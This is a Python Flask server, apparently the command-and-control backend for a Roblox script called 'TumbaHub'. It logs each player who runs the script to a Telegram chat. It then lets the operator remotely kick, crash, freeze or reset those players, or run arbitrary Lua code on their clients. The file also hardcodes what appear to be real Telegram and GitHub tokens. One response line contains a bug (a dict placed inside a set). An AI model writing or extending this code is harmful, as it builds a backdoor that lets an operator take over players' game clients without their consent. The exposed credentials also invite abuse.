from flask import Flask, request, jsonify
import requests
import json
import base64 # Обязательно добавляем для работы с GitHub
import time
import os

app = Flask(__name__)

# Твои данные Телеграма
TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN', '8693862606:AAEvhj2EJeSxHhaw0JopIb_oK-COEZKix1g')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '8426928414')

# --- НАСТРОЙКИ GITHUB DB ---
# ВАЖНО: Вставь сюда свой НОВЫЙ токен!
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN', '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a')
REPO_OWNER = 'repositorykreml1n'
REPO_NAME = 'commands'
FILE_PATH = 'players.json'

def load_players_from_github():
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
    
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        try:
            content_b64 = response.json()['content']
            content_str = base64.b64decode(content_b64).decode('utf-8')
            saved_players = json.loads(content_str)
            # Восстанавливаем словарь
            return {player: [] for player in saved_players}
        except Exception as e:
            print("Ошибка чтения базы:", e)
            return {}
    return {}

def save_players_to_github():
    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
    
    # 1. Получаем SHA текущего файла, чтобы GitHub разрешил перезапись
    sha = None
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        sha = response.json()['sha']
        
    # 2. Берем только список ников
    players_list = list(commands_queue.keys())
    content_str = json.dumps(players_list, indent=4)
    content_b64 = base64.b64encode(content_str.encode('utf-8')).decode('utf-8')
    
    # 3. Делаем коммит
    data = {
        "message": "Авто-сохранение базы TumbaHub",
        "content": content_b64
    }
    if sha:
        data["sha"] = sha
        
    requests.put(url, headers=headers, json=data)

# --- ХЕЛПЕРЫ ДЛЯ TELEGRAM ---
def send_telegram_message(chat_id, text, reply_markup=None, parse_mode=None):
    payload = {"chat_id": chat_id, "text": text}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    if parse_mode:
        payload["parse_mode"] = parse_mode
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json=payload, timeout=5)
    except Exception as e:
        print(f"Ошибка отправки сообщения: {e}")

def answer_callback(callback_id, text=None, show_alert=False):
    payload = {"callback_query_id": callback_id}
    if text:
        payload["text"] = text
        payload["show_alert"] = show_alert
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery", json=payload, timeout=5)
    except Exception as e:
        print(f"Ошибка ответа на callback: {e}")

# Загружаем базу при старте сервера!
commands_queue = load_players_from_github()
awaiting_reason = {}
awaiting_msg_text = {}
awaiting_msg_duration = {}
awaiting_execute = {}
last_seen = {}

@app.route('/')
def home():
    return "TumbaHub Server is running!"

@app.route('/api/send_message', methods=['POST'])
def send_message_from_client():
    data = request.json
    if not data or 'text' not in data:
        return jsonify({"status": "error", "message": "No text provided"}), 400
    
    client_message = data.get('text')
    # Просто пересылаем текст в основной чат
    send_telegram_message(TELEGRAM_CHAT_ID, f"🤖 **Сообщение от клиента:**\n\n{client_message}", parse_mode="Markdown")
    
    return jsonify({"status": "success"})

@app.route('/api/log_user', methods=['POST'])
def log_user():
    data = request.json
    if not data:
        return jsonify({"status": "error", "message": "No data"}), 400

    username = data.get('username', 'Unknown')
    user_id = data.get('userId', 'Unknown')
    
    # Если это новый игрок
    if username not in commands_queue:
        commands_queue[username] = []
        # Сохраняем в GitHub!
        save_players_to_github()
        
    last_seen[username] = time.time()

    msg = f"🟢 [V2] НОВЫЙ ЗАПУСК!\n👤 Ник: {username}\n🆔 ID: {user_id}"
    
    # === СОЗДАЕМ КНОПКИ ДЛЯ УПРАВЛЕНИЯ ===
    # В callback_data зашиваем действие и ник, например "kick_Player1"
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "🥾 Kick", "callback_data": f"kick_{username}"},
                {"text": "💥 Crash", "callback_data": f"crash_{username}"}
            ]
        ]
    }

    send_telegram_message(TELEGRAM_CHAT_ID, msg, reply_markup=keyboard)

    return jsonify({"status": "success"})

@app.route('/api/ping', methods=['GET'])
def ping():
    username = request.args.get('username')
    if username:
        last_seen[username] = time.time()
    return jsonify({"status": "success"})

@app.route('/api/get_command', methods=['GET'])
def get_command():
    username = request.args.get('username')
    
    if username in commands_queue and len(commands_queue[username]) > 0:
        cmd = commands_queue[username].pop(0) # Теперь мы достаем просто строку
        return jsonify({"status": "success", "command": cmd})
    
    return jsonify({"status": "empty"})


@app.route('/api/telegram_webhook', methods=['POST'])
def telegram_webhook():
    update = request.json
    
    # === БЛОК 1: ОБРАБОТКА ТЕКСТА ===
    if update and "message" in update and "text" in update["message"]:
        chat_id = str(update["message"]["chat"]["id"])
        text = update["message"]["text"]
        
        if chat_id == TELEGRAM_CHAT_ID:
            # 1. ГЛАВНОЕ МЕНЮ
            if text == "/menu":
                keyboard = {
                    "inline_keyboard": [
                        [{"text": "👥 Игроки", "callback_data": "menu_players"}],
                        [{"text": "🎮 Игры", "callback_data": "menu_games"}]
                    ]
                }
                send_telegram_message(TELEGRAM_CHAT_ID, "🎛 **Главное меню TumbaHub**\nВыберите раздел:", reply_markup=keyboard, parse_mode="Markdown")
                return jsonify({"status": "ok"})

            # НОВОЕ: Если бот ждет длительность сообщения
            if chat_id in awaiting_msg_duration:
                try:
                    duration = int(text)
                    data = awaiting_msg_duration.pop(chat_id)
                    target_user = data["user"]
                    msg_text = data["text"]

                    # Генерируем Lua-код для ScreenGui
                    lua_code = f"""
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.DisplayOrder = 999
local label = Instance.new("TextLabel", gui)
label.Size = UDim2.new(1, -40, 0, 100)
label.Position = UDim2.new(0.5, 0, 0, 20)
label.AnchorPoint = Vector2.new(0.5, 0)
label.BackgroundTransparency = 0.5
label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
label.TextColor3 = Color3.fromRGB(255, 255, 255)
label.Font = Enum.Font.SourceSansBold
label.TextSize = 24
label.TextWrapped = true
label.Text = "{msg_text}"
game:GetService("Debris"):AddItem(gui, {duration})
"""
                    action = f"/execute__{lua_code}"
                    if target_user not in commands_queue: commands_queue[target_user] = []
                    commands_queue[target_user].append(action)
                    send_telegram_message(TELEGRAM_CHAT_ID, f"✅ Сообщение '{msg_text}' на {duration} сек. отправлено игроку {target_user}!")
                except ValueError:
                    send_telegram_message(TELEGRAM_CHAT_ID, "⚠️ Ошибка: Введите число. Попробуйте снова.")
                return jsonify({{"status": "ok"}})

            # НОВОЕ: Если бот ждет текст сообщения
            if chat_id in awaiting_msg_text:
                target_user = awaiting_msg_text.pop(chat_id)
                awaiting_msg_duration[chat_id] = {"user": target_user, "text": text}
                send_telegram_message(TELEGRAM_CHAT_ID, f"💬 Сообщение: '{text}'.\n\nТеперь отправь длительность сообщения в секундах (например, 10).")
                return jsonify({"status": "ok"})

            # 2. ЕСЛИ БОТ ЖДЕТ СКРИПТ (Execute)
            if chat_id in awaiting_execute:
                target_user = awaiting_execute.pop(chat_id)
                action = f"/execute__{text}"
                
                if target_user not in commands_queue:
                    commands_queue[target_user] = []
                commands_queue[target_user].append(action)
                
                send_telegram_message(TELEGRAM_CHAT_ID, f"✅ Скрипт успешно отправлен в очередь игрока {target_user}!")
                return jsonify({"status": "ok"})

            # 3. ЕСЛИ БОТ ЖДЕТ ПРИЧИНУ КИКА
            if chat_id in awaiting_reason:
                target_user = awaiting_reason.pop(chat_id)
                action = f"/kick_{text}"
                
                if target_user not in commands_queue:
                    commands_queue[target_user] = []
                commands_queue[target_user].append(action)
                
                send_telegram_message(TELEGRAM_CHAT_ID, f"✅ {target_user} кикнут с причиной:\n💬 {text}")
                return jsonify({"status": "ok"})

            # 4. РУЧНОЙ ВВОД (через пробелы)
            parts = text.split(' ', 2)
            if len(parts) >= 2:
                base_cmd = parts[0]
                target_user = parts[1]
                
                if base_cmd == "/kick" and len(parts) == 3:
                    action = f"/kick_{parts[2]}" 
                elif base_cmd == "/execute" and len(parts) == 3:
                    action = f"/execute__{parts[2]}"
                else:
                    action = base_cmd
                
                if target_user not in commands_queue:
                    commands_queue[target_user] = []
                commands_queue[target_user].append(action)
                send_telegram_message(TELEGRAM_CHAT_ID, f"✅ Ручная команда отправлена {target_user}")

    # === БЛОК 2: ОБРАБОТКА КНОПОК ===
    if update and "callback_query" in update:
        callback = update["callback_query"]
        chat_id = str(callback["message"]["chat"]["id"])
        data = callback["data"]
        callback_id = callback["id"]
        
        if chat_id == TELEGRAM_CHAT_ID:
            
            # === ГЛОБАЛЬНЫЕ КНОПКИ ===
            if data == "menu_games":
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery",
                    json={"callback_query_id": callback_id, "text": "Раздел Игры пока пуст!", "show_alert": True}
                )
                return jsonify({"status": "ok"})
                
            elif data == "menu_players":
                if len(commands_queue) == 0:
                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": "⚠️ В базе пока нет игроков."})
                else:
                    # Генерируем кнопки-ники
                    player_buttons = []
                    current_time = time.time()
                    for player in commands_queue.keys():
                        # Если игрок пинговал сервер меньше 45 секунд назад -> Онлайн
                        if player in last_seen and (current_time - last_seen[player] < 45):
                            status_icon = "🟢"
                        else:
                            status_icon = "🔴"
                            
                        player_buttons.append([{"text": f"{status_icon} {player}", "callback_data": f"playerprof_{player}"}])
                    
                    keyboard = {"inline_keyboard": player_buttons}
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                        json={
                            "chat_id": TELEGRAM_CHAT_ID, 
                            "text": "👥 **Список активных игроков:**\nВыберите кого-нибудь для управления:",
                            "reply_markup": keyboard,
                            "parse_mode": "Markdown"
                        }
                    )
                requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery", json={"callback_query_id": callback_id})
                return jsonify({"status": "ok"})

            # === ЛОКАЛЬНЫЕ КНОПКИ (С НИКОМ) ===
            parts = data.split('_', 1)
            if len(parts) == 2:
                btn_action = parts[0]
                target_user = parts[1]
                
                # --- ОТКРЫТИЕ ПРОФИЛЯ ---
                if btn_action == "playerprof":
                    # Собираем меню профиля игрока
                    keyboard = {
                        "inline_keyboard": [
                            [{"text": "💬 Message", "callback_data": f"message_{target_user}"}],
                            [{"text": "⚡ Execute Custom Script", "callback_data": f"execselect_{target_user}"}],
                            [{"text": "🧊 Freeze", "callback_data": f"freeze_{target_user}"}, {"text": "🏃 Unfreeze", "callback_data": f"unfreeze_{target_user}"}],
                            [{"text": "🥾 Kick", "callback_data": f"kick_{target_user}"}, {"text": "💥 Crash", "callback_data": f"crash_{target_user}"}],
                            [{"text": "💀 Reset", "callback_data": f"reset_{target_user}"}],
                            [{"text": "✅ Check Status", "callback_data": f"checkstatus_{target_user}"}],
                            [{"text": "🔙 Назад к списку", "callback_data": "menu_players"}]
                        ]
                    }
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                        json={
                            "chat_id": TELEGRAM_CHAT_ID, 
                            "text": f"👤 **Профиль: {target_user}**\nЧто будем делать с этим игроком?", 
                            "reply_markup": keyboard,
                            "parse_mode": "Markdown"
                        }
                    )
                
                # --- ОТПРАВКА СООБЩЕНИЯ ---
                elif btn_action == "message":
                    awaiting_msg_text[chat_id] = target_user
                    # Очищаем другие состояния
                    if chat_id in awaiting_execute: del awaiting_execute[chat_id]
                    if chat_id in awaiting_reason: del awaiting_reason[chat_id]
                    
                    send_telegram_message(TELEGRAM_CHAT_ID, f"✍️ Отправь мне текст сообщения для игрока **{target_user}**:", parse_mode="Markdown")

                # --- ПРОВЕРКА СТАТУСА ---
                elif btn_action == "checkstatus":
                    action = "/check_status"
                    if target_user not in commands_queue: commands_queue[target_user] = []
                    commands_queue[target_user].append(action)
                    answer_callback(callback_id, text=f"✅ Запрос статуса отправлен {target_user}.")

                # --- ВЫПОЛНЕНИЕ СКРИПТА ---
                elif btn_action == "execselect":
                    awaiting_execute[chat_id] = target_user
                    if chat_id in awaiting_reason: del awaiting_reason[chat_id] # Очищаем конфликт состояний
                    if chat_id in awaiting_msg_text: del awaiting_msg_text[chat_id]
                    
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✍️ Отправь мне Lua-код для выполнения на клиенте **{target_user}**:", "parse_mode": "Markdown"}
                    )
                
                # --- КИК ---
                elif btn_action == "kick":
                    awaiting_reason[chat_id] = target_user
                    if chat_id in awaiting_execute: del awaiting_execute[chat_id]
                    if chat_id in awaiting_msg_text: del awaiting_msg_text[chat_id]
                    
                    keyboard = {"inline_keyboard": [[{"text": "Дефолт: Вы были кикнуты", "callback_data": f"defaultkick_{target_user}"}]]}
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"Напиши причину кика для {target_user} или нажми кнопку ниже:", "reply_markup": keyboard}
                    )
                
                elif btn_action == "defaultkick":
                    if chat_id in awaiting_reason:
                        del awaiting_reason[chat_id]
                    action = "/kick"
                    if target_user not in commands_queue: commands_queue[target_user] = []
                    commands_queue[target_user].append(action)
                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": f"✅ {target_user} кикнут (дефолт)."})
                    
                # --- КРАШ ---
                elif btn_action == "crash":
                    action = "/crash"
                    if target_user not in commands_queue: commands_queue[target_user] = []
                    commands_queue[target_user].append(action)
                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": f"💥 Краш отправлен {target_user}"})
                
                # --- РЕСЕТ ---
                elif btn_action == "reset":
                    action = "/reset"
                    if target_user not in commands_queue: 
                        commands_queue[target_user] = []
                    commands_queue[target_user].append(action)
                    requests.post(
                        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", 
                        json={"chat_id": TELEGRAM_CHAT_ID, "text": f"💀 Команда сброса (Reset) отправлена {target_user}"}
                    )
                
                # --- ЗАМОРОЗКА ---
                elif btn_action == "freeze":
                    action = "/freeze"
                    if target_user not in commands_queue: commands_queue[target_user] = []
                    commands_queue[target_user].append(action)
                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": f"🧊 Команда Freeze (Заморозка) отправлена {target_user}"})
                
                # --- РАЗМОРОЗКА ---
                elif btn_action == "unfreeze":
                    action = "/unfreeze"
                    if target_user not in commands_queue: commands_queue[target_user] = []
                    commands_queue[target_user].append(action)
                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT_ID, "text": f"🏃 Команда Unfreeze (Разморозка) отправлена {target_user}"})
                
            # Убираем часики загрузки с нажатой кнопки
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/answerCallbackQuery", json={"callback_query_id": callback_id})

    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
